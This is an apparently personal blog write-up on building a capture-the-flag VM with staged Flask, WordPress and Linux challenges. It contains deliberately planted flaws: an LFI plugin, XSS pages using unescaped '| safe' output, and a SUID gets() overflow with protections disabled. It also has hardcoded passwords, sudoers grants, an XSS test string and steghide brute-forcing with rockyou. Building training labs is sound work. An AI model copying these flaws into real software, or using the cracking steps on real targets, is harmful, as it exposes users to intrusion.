---
title: "Project: CTF_Building"
author: NeoVirex
categories: [Project]
tags: [CTF, Build, home-ctf]
render_with_liquid: false
media_subpath: /images/blogs/bunna/
image:
  path: 1room_img.png

description: "A comprehensive Capture The Flag (CTF) challenge series named “BUNNA”, designed with realistic network segmentation, progressive narrative, and layered technical puzzles covering steganography, web exploitation, privilege escalation, and more"
---




# CTF Project: BUNNA


## Quick Navigation
- [Bonus Layer: Flow & Experience](#bonus-layer-flow--experience)
- [Tools & Setup](#tools--setup)
- [Steganography Challenge](#steganography-challenge)
- [Entry Gateway: The Vault](#entry-gateway-the-vault)
- [CTF Server Configuration](#ctf-server-configuration)
- [XSS Hosting Site](#xss-hosting-site)
- [Messaging App Challenge](#messaging-app-challenge)
- [SUID Buffer Overflow Challenge](#suid-buffer-overflow-challenge)
- [VM Export Instructions](#vm-export-instructions)
- [Final Notes & Next Steps](#final-notes--next-steps)


## Description
A comprehensive Capture The Flag (CTF) challenge series named “BUNNA”, designed with realistic network segmentation, progressive narrative, and layered technical puzzles covering steganography, web exploitation, privilege escalation, and more.

## Short Summary
The BUNNA CTF guides players through a layered series of challenges: starting with hidden data extraction via steganography, unlocking web services progressively, exploiting XSS and authentication flaws, escalating privileges using SUID overflows, and finally packaging the environment as a VM. Each stage emphasizes manual exploration, realistic misdirection, and narrative-driven hints.



### Bonus Layer: Flow & Experience
**Sequence:**
1. Player starts at Gateway (port 5000)  
2. Solves the "All Saints Challenge"  
3. Unlocks access to Hanna (Apache, MySQL, SSH, FTP)  
4. Exploits Hanna to open Samuel (port 8080)  
5. Exploits Samuel to access Mingmi via SSH  
6. Escalates Mingmi to root  
7. Captures the final message and root flag

### Tools & Setup
- **VirtualBox Installation**  
  ```bash
  sudo apt update && sudo apt full-upgrade -y
  sudo apt install build-essential dkms linux-headers-$(uname -r) -y
  wget https://www.virtualbox.org/download/oracle_vbox_2016.asc
  sudo gpg --dearmor oracle_vbox_2016.asc -o /usr/share/keyrings/vbox-archive-keyring.gpg
  echo "deb [signed-by=/usr/share/keyrings/vbox-archive-keyring.gpg] https://download.virtualbox.org/virtualbox/debian bookworm contrib" | sudo tee /etc/apt/sources.list.d/vbox.list
  sudo apt update
  sudo apt install virtualbox-7.0 -y
  sudo /sbin/vboxconfig
  sudo usermod -aG vboxusers $USER
  sudo modprobe vboxdrv
  echo "✅ Done! Reboot and launch VirtualBox."
  ```
  ```bash
  reboot
  virtualbox
  ```

### Steganography Challenge
1. **Install `steghide`:**
   ```bash
   sudo apt update; sudo apt install steghide
   ```
2. **Embed a file:**
   ```bash
   steghide embed -cf picture.jpg -ef secret.txt
   ```
3. **Extract a file:**
   ```bash
   steghide extract -sf picture.jpg
   ```
4. **Inspect hidden content:**
   ```bash
   steghide info picture.jpg
   ```
5. **Brute-force passphrase:**
   ```bash
   stegcracker picture.jpg /usr/share/wordlists/rockyou.txt
   ```

### Entry Gateway: The Vault
- **Port:** 5000  
- **Tech:** Python + Flask  
- **Flow:** HTML form → key validation → start services & open ports → unlock next challenge.

```python
# app.py excerpt
SECRET_KEY = "ctf{first_key}"
@app.route("/submit", methods=["POST"])
def submit_key():
    if request.form["server_key"] == SECRET_KEY:
        subprocess.run([...start apache2, mysql, vsftpd, ssh...])
        return render_template("index.html", message="✅ Ports opened!")
    return render_template("index.html", message="❌ Incorrect key.")
```

### CTF Server Configuration
- **Sudoers**: Allow specific systemctl and ufw commands without password.
- **systemd service**: `ctf-app.service` auto-starts gateway.
- **Shutdown Service**: `ctf-shutdown.service` locks ports on shutdown.

### XSS Hosting Site
**Goal:** Host an XSS-vulnerable page under a different user, executable by `hanna`.
- **User:** `xsslab`
- **HTML:** A simple form rendering `{{ msg | safe }}`
- **Flask App:** Runs on port 8000 as `xsslab`.
- **Runner Script:** `start_xss_lab.sh` invoked by `hanna` via sudoers.

### Messaging App Challenge
**Tech Stack:** Flask (Python), HTML/CSS (Tailwind).  
**Features:**
- Login endpoint (`/login`)
- Suggestion box (`/suggest`) with unsanitized input → stored XSS.
- Dashboard at `/dashboard` checks cookie `session=user=Samuel`.

```python
# app.py excerpt
VALID_USERNAME = 'Samuel'; VALID_PASSWORD = 'samuel123@'
@app.route('/login', methods=['POST'])
def login():
    if creds match:
        resp.set_cookie('session','user=Samuel'); open('cookie.txt','w').write(...)
        return redirect('/dashboard')
```

### SUID Buffer Overflow Challenge
**C Program (`vuln.c`):**
```c
char buffer[64];
gets(buffer);
```
- Compile: `gcc -o vuln vuln.c -fno-stack-protector -z execstack -no-pie`
- Permissions: `chmod 4755 vuln`
- Flag in `/mimi/flag.txt`.

**Exploit plan:** Overwrite return with `give_shell()` address at offset 72.

### VM Export Instructions
1. **Cleanup VM**  
   ```bash
   sudo apt clean; rm -rf /tmp/*; history -c
   ```
2. **Export `.ova`:** Use Open Virtualization Format 1.0, include NAT MAC only, write manifest, exclude ISOs.
3. **Optional ZIP:** `zip bunna_server.zip bunna_server.ova`
4. **Upload** to TryHackMe.

## Final Notes & Next Steps
- Implement `bot.py` to read `cookie.txt` and auto-login.
- Add attacker server to collect stolen cookies.
- Package with PyInstaller or Docker.
- Develop final narrative hints and decoys.


# Full Project Content

## **CTF Project: BUNNA - Full Challenge Structure and Design Notes** 🎯🧠🔐

# Bonus Layer: Overall Flow & Experience 🔄🧵🗺️

**Sequence:**

1. Player starts at Gateway (port 5000)
2. Solves the "All Saints Challenge"
3. Unlocks access to Hanna (Apache, MySQL, SSH, FTP)
4. Exploits Hanna to open access to Samuel (port 8080)
5. Exploits Samuel to gain access to Mingmi (via SSH)
6. Escalates privileges on Mingmi to root
7. Captures the final message and root flag 🎯🏆🔚

**CTF Style:**

- Realistic network segmentation
- Emphasis on manual exploration rather than script automation
- Strong narrative progression with misdirection and layered clues 🧠🕵️‍♀️🕸️
    
    ---
    

This full design note captures everything planned and discussed ready to be built into an amazing CTF experience. 🚀📘👨‍💻

---

# For Target Machines 🎯 

## ✅ Base OS (Target Machine):

Use a light Linux distro, like:

Ubuntu Server (easy, clean)

Debian (very stable)

Alpine (if you're making small containers)

Arch Linux (if you want full control)



## ✅ Virtual box

```bash
sudo apt update && sudo apt full-upgrade -y
sudo apt install build-essential dkms linux-headers-$(uname -r) -y
wget https://www.virtualbox.org/download/oracle_vbox_2016.asc
sudo gpg --dearmor oracle_vbox_2016.asc -o /usr/share/keyrings/vbox-archive-keyring.gpg
echo "deb [signed-by=/usr/share/keyrings/vbox-archive-keyring.gpg] https://download.virtualbox.org/virtualbox/debian bookworm contrib" | sudo tee /etc/apt/sources.list.d/virtualbox.list
sudo apt update
sudo apt install virtualbox-7.0 -y
sudo /sbin/vboxconfig
sudo usermod -aG vboxusers $USER
sudo modprobe vboxdrv
echo "✅ Done! Now reboot your system and launch VirtualBox using the 'virtualbox' command or from the app menu."

```

---

After running this, **reboot your system**:

```bash
reboot

```

Then, open VirtualBox:

```bash
virtualbox

```

---

# First key 🔐 

## ✅ Step 1: Install `steghide`

#### On Kali or Debian/Ubuntu:

```bash
sudo apt update
sudo apt install steghide

```

---

## ✅ Step 2: Hide a file inside an image

#### Syntax:

```bash
steghide embed -cf <cover_file> -ef <file_to_hide>

```

#### Example:

```bash
steghide embed -cf picture.jpg -ef secret.txt

```

It will ask for a **passphrase** (like a password). Set one or leave it blank.

✅ Now `secret.txt` is hidden **inside** `picture.jpg`

> You can rename picture.jpg and share it — no one will know it has a secret inside.
> 

---

## ✅ Step 3: Extract the hidden file

```bash
steghide extract -sf picture.jpg

```

It will ask for the **passphrase** if one was used.

✅ It will extract the hidden file back (e.g., `secret.txt`)

---

## ✅ Step 4: Check if anything is hidden (without extracting)

```bash
steghide info picture.jpg

```

You’ll see something like:

```
"picture.jpg":
  format: jpeg
  capacity: 3.7 KB
  embedded file: yes

```

---

## 🛠️ Real CTF Tip:

If you’re playing a CTF and get a random `.jpg` or `.wav`, try:

```bash
steghide extract -sf mystery.jpg

```

Try a **blank passphrase** or common ones like:

- `ctf`
- `password`
- `admin`
- or use a brute-force tool like `stegcracker`

---

## 🔓 Bonus: Brute Force Hidden Passwords

```bash
stegcracker picture.jpg /usr/share/wordlists/rockyou.txt
```

---

---

# Entry Gateway: The Vault 🔑🌐🛡️

**Purpose:** Prevents access to all other challenges until a secret key is submitted. 🧱🚪🔍

**Open Port:** `5000`

### Website

---

### **🛠 Step-by-Step Plan**

---

## ✅ Step 1: Basic Setup

- **Tool:** Python + Flask
- **Goal:** Create a web server with one route to receive the key input.
- **Frontend:** HTML input form
- **Backend:** Flask app that checks the key and responds

---

## ✅ Step 2: Key Validation Logic

- Store the correct key (e.g., `"ctf{first_key}"`)
- If the submitted key is correct:
    - Respond with a success message
    - Trigger other services/ports

---

## ✅ Step 3: Triggering More Resources

- This can include:
    - Starting new Docker containers
    - Opening firewall ports
    - Showing new web pages/challenges

---

## ✅ Step 4: Progressive Challenge Design

- As users unlock each level, more flags and clues appear.
- Each level could have its own secret key and challenge.

---

## 🔧 Let's Begin with Step 1

---

## 🧪 Folder Structure And Files

```
ctf-site/
│
├── app.py               <-- Flask app
├── templates/
│   └── index.html       <-- Web page with input
└── keys.txt             <-- (Optional) list of valid keys

```

---

#### 📄 `index.html` (in `templates/`)

```html
<!DOCTYPE html>
<html>
<head>
  <title>CTF Challenge</title>
</head>
<body>
  <h1>Enter the Server Key</h1>
  <form action="/submit" method="post">
    <input type="text" name="server_key" placeholder="Enter Key" required>
    <button type="submit">Submit</button>
  </form>
  {% if message %}
    <p>{{ message }}</p>
  {% endif %}
</body>
</html>

```

#### modified version of index.html

```jsx
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CyberSeal CTF Challenge</title>
  <style>
    :root {
      --primary: #0af;
      --secondary: #0f2;
      --bg-dark: #111;
      --bg-darker: #0a0a0a;
      --text: #ddd;
      --text-highlight: #fff;
      --glow: 0 0 10px var(--primary), 0 0 20px var(--primary);
    }
    
    body {
      background-color: var(--bg-dark);
      background-image: 
        radial-gradient(circle at 20% 30%, rgba(0, 170, 255, 0.1) 0%, transparent 20%),
        radial-gradient(circle at 80% 70%, rgba(0, 255, 34, 0.1) 0%, transparent 20%);
      color: var(--text);
      font-family: 'Courier New', monospace;
      margin: 0;
      padding: 0;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      overflow-x: hidden;
    }
    
    .container {
      background-color: var(--bg-darker);
      border: 1px solid var(--primary);
      border-radius: 5px;
      box-shadow: var(--glow);
      padding: 2rem;
      width: 80%;
      max-width: 600px;
      position: relative;
      overflow: hidden;
    }
    
    .container::before {
      content: "";
      position: absolute;
      top: -2px;
      left: -2px;
      right: -2px;
      bottom: -2px;
      background: linear-gradient(45deg, var(--primary), var(--secondary));
      z-index: -1;
      filter: blur(5px);
      opacity: 0.3;
    }
    
    h1 {
      color: var(--text-highlight);
      text-align: center;
      margin-bottom: 2rem;
      text-shadow: 0 0 5px var(--primary);
      position: relative;
      font-size: 2rem;
    }
    
    h1::after {
      content: "";
      display: block;
      width: 100px;
      height: 3px;
      background: linear-gradient(90deg, var(--primary), var(--secondary));
      margin: 10px auto;
      border-radius: 3px;
    }
    
    .form-group {
      margin-bottom: 1.5rem;
    }
    
    input[type="text"] {
      width: 100%;
      padding: 12px;
      background-color: rgba(0, 0, 0, 0.5);
      border: 1px solid var(--primary);
      border-radius: 3px;
      color: var(--text-highlight);
      font-family: 'Courier New', monospace;
      font-size: 1rem;
      box-sizing: border-box;
      transition: all 0.3s ease;
    }
    
    input[type="text"]:focus {
      outline: none;
      border-color: var(--secondary);
      box-shadow: 0 0 10px var(--secondary);
    }
    
    button {
      background: linear-gradient(45deg, var(--primary), var(--secondary));
      color: black;
      border: none;
      padding: 12px 24px;
      font-family: 'Courier New', monospace;
      font-weight: bold;
      font-size: 1rem;
      border-radius: 3px;
      cursor: pointer;
      width: 100%;
      transition: all 0.3s ease;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    
    button:hover {
      transform: translateY(-2px);
      box-shadow: 0 5px 15px rgba(0, 170, 255, 0.4);
    }
    
    button:active {
      transform: translateY(0);
    }
    
    .message {
      margin-top: 1.5rem;
      padding: 1rem;
      border-radius: 3px;
      text-align: center;
      animation: fadeIn 0.5s ease;
    }
    
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(10px); }
      to { opacity: 1; transform: translateY(0); }
    }
    
    .scanlines {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(
        rgba(0, 0, 0, 0) 50%, 
        rgba(0, 0, 0, 0.25) 50%
      );
      background-size: 100% 4px;
      pointer-events: none;
      z-index: 1000;
    }
    
    .binary-rain {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      overflow: hidden;
      z-index: -1;
      opacity: 0.1;
    }
    
    .binary-digit {
      position: absolute;
      color: var(--primary);
      font-size: 16px;
      animation: fall linear infinite;
    }
    
    @keyframes fall {
      to {
        transform: translateY(100vh);
      }
    }
  </style>
</head>
<body>
  <div class="binary-rain" id="binaryRain"></div>
  <div class="scanlines"></div>
  
  <div class="container">
    <h1>CYBERSEAL SERVER ACCESS</h1>
    <div class="form-group">
      <form action="/submit" method="post">
        <input type="text" name="server_key" placeholder="ENTER SERVER KEY" required>
        <br><br>
        <button type="submit">AUTHENTICATE</button>
      </form>
    </div>
    
    {% if message %}
      <div class="message" style="background: {% if 'granted' in message.lower() %}rgba(0, 255, 34, 0.2){% else %}rgba(255, 0, 34, 0.2){% endif %}; 
                    border: 1px solid {% if 'granted' in message.lower() %}var(--secondary){% else %}red{% endif %};">
        {{ message }}
      </div>
    {% endif %}
  </div>

  <script>
    // Create binary rain effect
    const binaryRain = document.getElementById('binaryRain');
    const digits = '01';
    
    function createBinaryDigit() {
      const digit = document.createElement('div');
      digit.className = 'binary-digit';
      digit.textContent = digits.charAt(Math.floor(Math.random() * digits.length));
      digit.style.left = Math.random() * 100 + 'vw';
      digit.style.animationDuration = (Math.random() * 3 + 2) + 's';
      digit.style.opacity = Math.random();
      binaryRain.appendChild(digit);
      
      // Remove digit after animation completes
      setTimeout(() => {
        digit.remove();
      }, parseFloat(digit.style.animationDuration) * 1000);
    }
    
    // Create initial digits
    for (let i = 0; i < 50; i++) {
      setTimeout(createBinaryDigit, i * 100);
    }
    
    // Continue creating digits
    setInterval(createBinaryDigit, 100);
    
    // Add typing effect to input when page loads
    const input = document.querySelector('input[name="server_key"]');
    const placeholderText = "ENTER SERVER KEY";
    let i = 0;
    
    function typePlaceholder() {
      if (i < placeholderText.length) {
        input.placeholder = placeholderText.substring(0, i+1) + (i === placeholderText.length-1 ? '' : '▋');
        i++;
        setTimeout(typePlaceholder, Math.random() * 100 + 50);
      }
    }
    
    setTimeout(typePlaceholder, 1000);
  </script>
</body>
</html>
```

---

#### 🐍 `app.py` Flask
```jsx
import subprocess
from flask import Flask, render_template, request

app = Flask(__name__)
SECRET_KEY = "ctf{first_key}"

@app.route("/", methods=["GET"])
def index():
    return render_template("index.html")

@app.route("/submit", methods=["POST"])
def submit_key():
    key = request.form.get("server_key")
    if key == SECRET_KEY:
        try:
            subprocess.run(["sudo", "systemctl", "start", "apache2"], check=True)
            subprocess.run(["sudo", "systemctl", "start", "mysql"], check=True)
            subprocess.run(["sudo", "systemctl", "start", "vsftpd"], check=True)
            subprocess.run(["sudo", "systemctl", "start", "ssh"], check=True)

            subprocess.run(["sudo", "ufw", "allow", "80"], check=True)
            subprocess.run(["sudo", "ufw", "allow", "3306"], check=True)
            subprocess.run(["sudo", "ufw", "allow", "21"], check=True)
            subprocess.run(["sudo", "ufw", "allow", "22"], check=True)

            message = "✅ Ports and services opened successfully!"
        except subprocess.CalledProcessError as e:
            message = f"❌ Error: {e}"
    else:
        message = "❌ Incorrect key. Try again."

    return render_template("index.html", message=message)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)

```

---

## ✅ Step 1: Configure `sudoers` (Allow only specific commands)

Run:

```bash
sudo visudo

```

Add this at the bottom (replace `neo` with your actual username if different):

```
ctfadmin ALL=(ALL) NOPASSWD: /bin/systemctl start apache2, /usr/sbin/ufw allow 3306, /usr/sbin/ufw allow 22, /bin/systemctl start vsftpd, /usr/sbin/ufw allow 21, /bin/systemctl stop apache2, /bin/systemctl stop vsftpd, /usr/sbin/ufw deny 3306, /usr/sbin/ufw deny 22, /usr/sbin/ufw deny 21

```

✅ This allows `app.py` to start required services, and a shutdown script to stop them — safely, no full sudo access.

---

## ✅ Step 2: Create a `systemd` service to auto-start `app.py`

Create a new systemd service file:

```bash
sudo nano /etc/systemd/system/ctf-app.service

```

Paste:

```
[Unit]
Description=CTF Key Gateway
After=network.target

[Service]
User=ctfadmin
WorkingDirectory=/home/ctfadmin/ctf
ExecStart=/usr/bin/python3 /home/ctfadmin/ctf/app.py
Restart=always

[Install]
WantedBy=multi-user.target

```

Save and enable it:

```bash
sudo systemctl daemon-reexec
sudo systemctl daemon-reload
sudo systemctl enable ctf-app.service
sudo systemctl start ctf-app.service

```

---

## ✅ Step 3: Shutdown script to lock all ports again

Create the script:

```bash
sudo nano /usr/local/bin/ctf-shutdown.sh

```

Paste:

```bash
#!/bin/bash
sudo systemctl stop apache2
sudo systemctl stop vsftpd
sudo ufw deny 3306
sudo ufw deny 22
sudo ufw deny 21

```

Make it executable:

```bash
sudo chmod +x /usr/local/bin/ctf-shutdown.sh

```

Now run it automatically on shutdown:

```bash
sudo nano /etc/systemd/system/ctf-shutdown.service

```

Paste:

```
[Unit]
Description=CTF Service Shutdown Cleaner
DefaultDependencies=no
Before=shutdown.target reboot.target halt.target

[Service]
Type=oneshot
ExecStart=/usr/local/bin/ctf-shutdown.sh
RemainAfterExit=true

[Install]
WantedBy=halt.target reboot.target shutdown.target

```

Enable the shutdown service:

```bash
sudo systemctl daemon-reload
sudo systemctl enable ctf-shutdown.service

```

---

## ✅ Now Your CTF Server Works Like This:

- 🟢 On Boot: Only `app.py` runs and waits for the correct key
- 🔐 Nothing else is open (SSH, FTP, Apache, MySQL = all locked)
- ✅ When key is submitted: services start, ports open
- 🔴 On shutdown: all services stop and ports are closed again
- 🔁 On reboot: everything stays locked again until key is re-submitted

---



---

#### ✅ Summary
---

**Technology Stack:**

- **Frontend:** HTML, CSS (simple, clean UI)
- **Backend:** Python (Flask) or PHP (lightweight)
- **Security Logic:** Python/Flask preferred for simplicity

**Challenge Flow:**

1. Web form asks for a secret key ("The All Saints Challenge")
2. Player must solve an external riddle/puzzle to find the key
3. Player submits the key into the input field
4. Backend checks the key:
    - If correct: a script runs to open required ports to access Hanna (Apache 80, MySQL 3306)
    - If incorrect: message displays "Incorrect key. Try again."

🔧📝💻

The backend script (written in Python using Flask) verifies the key. If it's correct, it opens additional service ports or activates background services running on the server. 🚀🔓📡

- Flask (Python)
- HTML (Form)
- ufw/iptables (for port control)

**If You Have Time:** Use JavaScript to add visual effects to the form. ✨🎨📲

---

# Create Users

```jsx
sudo adduser username
```

---

# User 1: HANNA 💾🧩🔍

**Services:**

---

## 🚨 Install Docker Engine
---

### ✅GPG Key Import:

```bash
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker.gpg

```

### Add Docker repository:

```bash
echo "deb [arch=amd64 signed-by=/usr/share/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
```

---

---

### ✅for Kali Linux

For **Kali**, the better way is to install Docker using Kali’s own package repo:

### Step-by-step:

```bash
sudo apt update
sudo apt install -y docker.io
sudo systemctl start docker
sudo systemctl enable docker
```

### Then install Docker Compose:

```bash
sudo apt install -y docker-compose
```

---

### ✅ Confirm It's Working

Run:

```bash
docker --version
docker-compose --version
```

Then:

```bash
sudo docker run hello-world
```

This will test that Docker is installed correctly.

---



## This is the WordPress -docker-compose

### Install MySql, and Apache2 and setup

---

## ✅ Step-by-step Breakdown:

### 🧱 1. **Update system**

```bash
sudo apt update
sudo apt install apache2
sudo apt install mysql-server
sudo apt install php libapache2-mod-php php-mysql php-gd php-cli php-curl php-xml
```

This updates your system’s package list (like refreshing the app store).

---

### 🌐 2. **Install Apache web server**

```bash
sudo apt install apache2

```

Apache is the software that serves your website on the internet (like a waiter bringing your food).

---

### 🛢️ 3. **Install MySQL database**

```bash
sudo apt install mysql-server

```

MySQL stores all the WordPress data: users, posts, passwords, etc.

---

### 🐘 4. **Install PHP and required extensions**

```bash
sudo apt install php libapache2-mod-php php-mysql php-gd php-cli php-curl php-xml

```

PHP runs WordPress. These extra modules make PHP work with MySQL, images, XML, etc.

---

### 🔐 5. **Secure your MySQL server**

```bash
sudo mysql_secure_installation

```

This helps you set a **root password**, remove test users, and improve MySQL security.

---

### ⚙️ 6. **Set up WordPress database and user**

```bash
sudo mysql

```

You enter MySQL shell.

Inside MySQL shell, run these:

👉 Creates a **WordPress database**.

```sql
CREATE DATABASE wordpress DEFAULT CHARACTER SET utf8 COLLATE utf8_unicode_ci;

```

👉 Creates a **new database user**.

```sql
CREATE USER 'wordpressuser'@'localhost' IDENTIFIED BY 'password';

```

👉 Gives full access to `wordpressuser` on the `wordpress` database.

```sql
GRANT ALL ON wordpress.* TO 'wordpressuser'@'localhost';

```

👉 Reloads permission changes and exits MySQL.

```sql
FLUSH PRIVILEGES;
EXIT;

```

---

### 📁 7. **Download and setup WordPress**

```bash
cd /var/www/html
```

Change to the folder where Apache shows websites.

```bash
sudo wget https://wordpress.org/latest.tar.gz

```

Download the **latest version** of WordPress.

```bash
sudo tar -xzvf latest.tar.gz

```

Unpack the archive.

```bash
sudo cp -a wordpress/. /var/www/html/

```

Copy WordPress files into the main web folder.

---

### 🌐 8. **Create Apache config file for WordPress**

```bash
sudo nano /etc/apache2/sites-available/wordpress.conf
```

Create a config file to tell Apache where your site lives.

Paste this:

```
<VirtualHost *:80>
    ServerAdmin webmaster@localhost
    ServerName your_domain
    DocumentRoot /var/www/html
    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

```

Replace `your_domain` with your actual domain or server IP.

---

## Starting the docker

create a file named:- docker-compose.yml

### docker-compose.yml

```jsx
version: '3.3'
services:
  wordpress:
    depends_on:
      - db
    image: wordpress:latest
    volumes:
      - wordpress_files:/var/www/html
    ports:
      - "81:80" # ✅ Host 81 → Container 80
    restart: always
    environment:
      WORDPRESS_DB_HOST: db:3306
      WORDPRESS_DB_USER: wordpress
      WORDPRESS_DB_PASSWORD: wordpresspassword
      WORDPRESS_DB_NAME: wordpress
  db:
    image: mysql:latest
    volumes:
      - db_data:/var/lib/mysql
    ports:
      - "3306:3306"
    restart: always
    environment:
      MYSQL_ROOT_PASSWORD: myrootpassword
      MYSQL_DATABASE: wordpress
      MYSQL_USER: wordpress
      MYSQL_PASSWORD: wordpresspassword
volumes:
  wordpress_files:
  db_data:
```

### Start Running Docker Using The Docker Compose

```jsx
sudo docker-compose up --build
```

http://localhost:81/w...

create a admin account 

```jsx
Sitename   Bunna
Username    hanna
Password    konjobunna
Email       hanna@hunna.thm
```

## Creating a plugin

Openning shell to the docker 

```jsx
sudo docker ps
sudo docker exec -it d562ac6c168c bin/bash
```

Upgrade the shell

```jsx
script /dev/null -c bash
```

And navigate to /var/www/html/wp-content/plugins 

### Building plugin Bunna.php

```jsx
<?php
/**
 * Plugin Name: Bunna
 * Plugin URI: http://example.com
 * Description: bash64hint > bWFpbiBwYWdlOnNlYXJjaCAoKTpzb3VyY2UgQ29kZTpwbHVnaW4gYnVubmE=  
 * Version: 1.0
 * Author:  neo
 * Author URI: http://example.com
 */

// Shortcode function...
function report_reader_include_file($atts) {
    if (!current_user_can('manage_options')) {
        return 'You do not have sufficient permissions to access this content.';
    }

    $atts = shortcode_atts(array(
        'path' => '',
    ), $atts);

    $path = sanitize_text_field($atts['path']);
    $full_path = ABSPATH . $path;

    if (file_exists($full_path)) {
        return file_get_contents($full_path);
    } else {
        return 'The specified file does not exist or cannot be accessed.';
    }
}
add_shortcode('include_report', 'report_reader_include_file');
?>

```

And adding hint to the main page in Bash64

- Apache Web Server on port `80`

modifyed

- MySQL Server on port `3306`
- SSH enabled for user Hanna 🔐🖥️🗝️

**Challenge:**

- Apache hosts a WordPress site and a introduction wenbsite
- Username: `Hanna`, Password: `sudohanna`
- Custom plugin contains an **LFI vulnerability**
- Players must identify and exploit the vulnerability 🛠️🧠📂

**Flags & Scripts:**

- Hidden user flag placed deep within the directory structure
- A `shadow.txt` wordlist file is hosted via Apache for password cracking
- A hidden script is located in a root-level directory (e.g., `/opt/script.py`), not directly navigable via `cd` commands. However, it is executable by Hanna through direct path execution.
- **Script Purpose:** Opens Samuel’s challenge port (e.g., `8001`) 🔐🔄📤

### Hosting Site For XXS

## 🎯 Goal:

When the player login to user `hanna` and runs a script (e.g. `xss_host.sh`), it:

- ✅ **Starts a small website** that hosts an **XSS vulnerable page**
- ✅ The **web files live in another user’s directory** (like `root` or `xsslab`)
- ✅ The script **only runs the server**, it cannot edit or write to the web files)

---

## ✅ Step-by-Step Plan

### 📁 1. Put the Website Files There

```bash
sudo mkdir -p /home/mimi/jsi-ctf/templates
sudo nano /home/mimi/jsi-ctf/templates/index.html

```

### index.html

```html
<!DOCTYPE html>
<html>
<head><title>XSS Lab</title></head>
<body>
  <h1>XSS Playground</h1>
  <form method="GET">
    <input name="msg" placeholder="Say something...">
    <button type="submit">Submit</button>
  </form>
  <p>Output: {{ msg | safe }}</p>
</body>
</html>

```
Paste a simple XSS page:

### Modified index.html

```jsx
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>XSS Lab - Playground</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    /* Reset */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background-color: #f3f4f6;
      font-family: Arial, sans-serif;
      color: #333;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }

    .container {
      background-color: #fff;
      padding: 2rem;
      border-radius: 1rem;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
      width: 100%;
      max-width: 400px;
    }

    h1 {
      text-align: center;
      color: #6b21a8;
      margin-bottom: 1.5rem;
      font-size: 1.8rem;
    }

    form {
      display: flex;
      flex-direction: column;
      gap: 1rem;
    }

    input[type="text"] {
      padding: 0.75rem;
      border: 1px solid #ccc;
      border-radius: 0.5rem;
      font-size: 1rem;
    }

    button {
      background-color: #6b21a8;
      color: white;
      border: none;
      padding: 0.75rem;
      border-radius: 0.5rem;
      font-size: 1rem;
      cursor: pointer;
      transition: background 0.3s ease;
    }

    button:hover {
      background-color: #5b1a93;
    }

    .output {
      margin-top: 1.5rem;
      background-color: #f9fafb;
      border: 1px solid #e5e7eb;
      border-radius: 0.5rem;
      padding: 1rem;
    }

    .output h2 {
      font-size: 0.9rem;
      color: #666;
      margin-bottom: 0.5rem;
    }

    .output p {
      font-size: 1.1rem;
      word-wrap: break-word;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>🧪 XSS Playground</h1>
    <form method="GET">
      <input type="text" name="msg" placeholder="Say something...">
      <button type="submit">Submit</button>
    </form>

    <div class="output">
      <h2>💬 Output:</h2>
      <p>{{ msg | safe }}</p>
    </div>
  </div>
</body>
</html>

```

---

### 🐍 2. Create the Flask App in `xsslab` Home

```bash
sudo nano /home/mimi/jsi-ctf/app.py

```

Paste:

```python
from flask import Flask, request, render_template

app = Flask(__name__)

@app.route("/")
def index():
    msg = request.args.get("msg", "")
    return render_template("index.html", msg=msg)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)

```

---

### 🔒 3. Secure the Files

Make the directory **owned by `xsslab` only**:

```bash
sudo chown -R mimi:mimi home/mimi/jsi-ctf
sudo chmod -R 755 /home/mimi/jsi-ctf

```

---

### ⚙️ 4. Create the Runner Script in `hanna`’s Home

This script will **not modify anything**, it just runs the server.

```bash
nano /home/hanna/start_xss_lab.sh

```

Paste:

```bash
#!/bin/bash
sudo -u mimi python3 /home/mimi/jsi-ctf/app.py
#!/bin/bash
sudo -u mimi /usr/bin/python3 /home/mimi/jsi-ctf/app.py

```

Make it executable:

```bash
chmod +x /home/hanna/start_xss_lab.sh

```

---

### 🔐 5. Secure `hanna`'s Permissions

If you want to **allow `hanna` to run only this one command as `xsslab`**:

Edit sudoers:

```bash
sudo visudo

```

Add this line:

```
hanna ALL=(mimi) NOPASSWD: /usr/bin/python3 /home/mimi/jsi-ctf/app.py

```

Update the script in `hanna` to:

```bash
#!/bin/bash
sudo -u xsslab /usr/bin/python3 /home/xsslab/jsi-ctf-site/app.py

```

✅ Now, `hanna` can start the vulnerable site, but **not edit it**.

---

### ✅ 6. Test It

Log in as `hanna`:

```bash
su - hanna
./start_xss_lab.sh

```

Visit:

```
<http://localhost:8000>

```

Try:

```
<http://localhost:8000/?msg=><script>alert(1)</script>

```

Boom 💥 — working XSS.

---

## ✅ Summary

| 🔒 Secure? | ✅ Yes |
| --- | --- |
| Hanna can edit files | ❌ No |
| Hanna can run server | ✅ Yes (only) |
| Files are separate | ✅ In `xsslab` user |
| Realistic challenge | ✅ Like real labs |

---

**Hints:**

- Logs in `/var/log/` indicate plugin errors
- Clues point to the script's location in `/opt/`
- Fake config backups and `.bak` files present
- Decoy flags mislead players
- Background narrative from Hanna is embedded in blog entries and local notes 🧾📘🔍

**Tools Needed by Players:**

- `curl`, `gobuster`/`dirb`, LFI cheat sheets
- Basic MySQL enumeration 🛠️🧪💡

---

# User 2: SAMUEL 🕸️📦💣

**Service:**

- Custom vulnerable web app running on port `8001`

